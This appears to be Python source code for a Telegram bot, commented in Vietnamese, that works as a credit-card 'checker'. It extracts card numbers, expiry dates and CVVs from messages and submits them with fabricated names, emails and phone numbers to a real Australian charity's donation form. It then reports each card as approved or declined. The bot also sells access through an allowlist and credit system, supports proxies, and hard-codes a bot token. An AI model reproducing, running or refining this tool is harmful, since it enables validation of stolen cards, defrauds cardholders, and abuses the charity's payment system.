import logging 
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import time

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thiết lập nest_asyncio
nest_asyncio.apply()

# Hàm để tạo số ngẫu nhiên trong khoảng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# Hàm để tạo email ngẫu nhiên
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# Hàm để tạo tên ngẫu nhiên
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Hàm để tạo mã bưu điện ngẫu nhiên
def random_zipcode():
    return random_num(1000, 9000)

# Hàm để kiểm tra định dạng thẻ và lấy thông tin
def extract_card_info(card_input):
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# Hàm để tìm thông báo lỗi trong phản hồi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()
    return None

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")

# Hàm xử lý lệnh /credit
async def credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != 2077786453:  # Kiểm tra admin
        await update.message.reply_text("Chỉ có admin mới có quyền thực hiện lệnh này.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Vui lòng nhập lệnh theo định dạng: /credit <user_id> <credit>")
        return

    user_id = int(context.args[0])
    credit = int(context.args[1])

    # Cập nhật số dư tín dụng người dùng
    with open("user_credits.txt", "a") as f:
        f.write(f"{user_id},{credit}\n")
    await update.message.reply_text(f"Đã thêm {credit} tín dụng cho người dùng {user_id}.")

# Hàm để lấy số dư tín dụng của người dùng
async def user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        with open("user_credits.txt", "r") as f:
            credits = {int(line.split(',')[0]): int(line.split(',')[1]) for line in f.readlines()}
        user_credit = credits.get(user_id, 0)
        await update.message.reply_text(f"Số dư tín dụng của bạn: {user_credit}")
    except FileNotFoundError:
        await update.message.reply_text("Chưa có người dùng nào được ghi nhận.")

# Hàm xử lý lệnh /allow
async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != 2077786453:  # Kiểm tra admin
        await update.message.reply_text("Chỉ có admin mới có quyền thực hiện lệnh này.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Vui lòng nhập lệnh theo định dạng: /allow <user_id>")
        return

    user_id = int(context.args[0])
    with open("allowed_users.txt", "a") as f:
        f.write(f"{user_id}\n")
    await update.message.reply_text(f"Đã cho phép người dùng {user_id}.")

# Hàm xử lý lệnh /unallow
async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != 2077786453:  # Kiểm tra admin
        await update.message.reply_text("Chỉ có admin mới có quyền thực hiện lệnh này.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Vui lòng nhập lệnh theo định dạng: /unallow <user_id>")
        return

    user_id = int(context.args[0])
    try:
        with open("allowed_users.txt", "r") as f:
            allowed_users = f.readlines()
        with open("allowed_users.txt", "w") as f:
            for line in allowed_users:
                if line.strip() != str(user_id):
                    f.write(line)
        await update.message.reply_text(f"Đã xóa quyền truy cập của người dùng {user_id}.")
    except FileNotFoundError:
        await update.message.reply_text("Không tìm thấy tệp cho phép người dùng.")

# Hàm xử lý lệnh /proxy
async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != 2077786453:  # Kiểm tra admin
        await update.message.reply_text("Chỉ có admin mới có quyền thực hiện lệnh này.")
        return

    if len(context.args) != 4:
        await update.message.reply_text("Vui lòng nhập lệnh theo định dạng: /proxy <ip>:<port>:<user>:<pass>")
        return

    proxy = ':'.join(context.args)
    await update.message.reply_text(f"Proxy đã được thiết lập: {proxy}")
    # Lưu proxy vào file hoặc cấu hình nếu cần

# # Hàm xử lý tin nhắn
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    card_info = extract_card_info(user_input)

    if not card_info:
        return

    # Kiểm tra xem người dùng có được phép sử dụng hay không
    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if update.effective_user.id not in allowed_users:
        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
        return

    cc, mes, ano, cvv = card_info

    current_year = int(datetime.now().strftime("%y"))
    current_full_year = int(datetime.now().strftime("%Y"))
    current_month = int(datetime.now().strftime("%m"))

    if len(ano) == 2:
        ano = "20" + ano
    ano = int(ano)

    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
        await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
        return

    phone = random_num(710000009, 900000009)
    email = random_email()
    name = random_name()
    zipcode = random_zipcode()

    await update.message.reply_text("Đang xử lý thông tin...")

    start_time = time.time()

    # Logging để theo dõi dữ liệu gửi đi
    logger.info(f"Sending data to API: Name: {name}, Phone: {phone}, Email: {email}, Zipcode: {zipcode}, Card: {cc}|{mes}|{ano}|{cvv}")

    async with aiohttp.ClientSession() as session:
        try:
            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
                                    data={
                                        'tfa_4': 'tfa_5',
                                        'tfa_52': 'tfa_53',
                                        'tfa_7': 'tfa_317',
                                        'tfa_19': '1',
                                        'tfa_20': '',
                                        'tfa_21': name,
                                        'tfa_23': 'Vu',
                                        'tfa_27': phone,
                                        'tfa_2276': zipcode,
                                        'tfa_25': email,
                                        'tfa_48': 'Web',
                                        'tfa_50': 'tfa_50',
                                        'tfa_59': cc,
                                        'tfa_60': mes,
                                        'tfa_70': ano,
                                        'tfa_62': cvv,
                                        'tfa_2273': 'G-BCL7XEG4WC',
                                        'tfa_2274': 'GTM-WMPTRWL',
                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
                                        'tfa_dbFormId': '151',
                                        'tfa_dbResponseId': '',
                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
                                        'tfa_dbWorkflowSessionUuid': '',
                                        'tfa_dbTimeStarted': '1727426006',
                                        'tfa_dbVersionId': '29',
                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
                                    }) as response:

                elapsed_time = time.time() - start_time
                elapsed_seconds = round(elapsed_time, 2)

                # Thêm logging để theo dõi toàn bộ phản hồi từ API
                response_text = await response.text()
                logger.info(f"API Response: {response_text}")

                final_url = str(response.url)
                logger.info(f"Final URL: {final_url}")

                if "https://anglicaresa.com.au/success/" in final_url:
                    result_message = f"""𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved
𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
                else:
                    # Kiểm tra lỗi phản hồi và thêm vào logging
                    error_message = extract_error_message(response_text)
                    logger.error(f"Error in response: {error_message}")

                    result_message = f"""Declined 

𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message if error_message else 'Unknown Error'}
𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

                await update.message.reply_text(result_message, parse_mode="HTML")

        except Exception as e:
            logger.error(f"Error while making request: {e}")
            await update.message.reply_text("Đã xảy ra lỗi khi gửi yêu cầu đến API.")


# Hàm main
async def main():
    application = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("credit", credit))
    application.add_handler(CommandHandler("user", user))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("unallow", unallow_user))
    application.add_handler(CommandHandler("proxy", set_proxy))
    application.add_handler(MessageHandler(filters.text & ~filters.command, handle_message))

    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
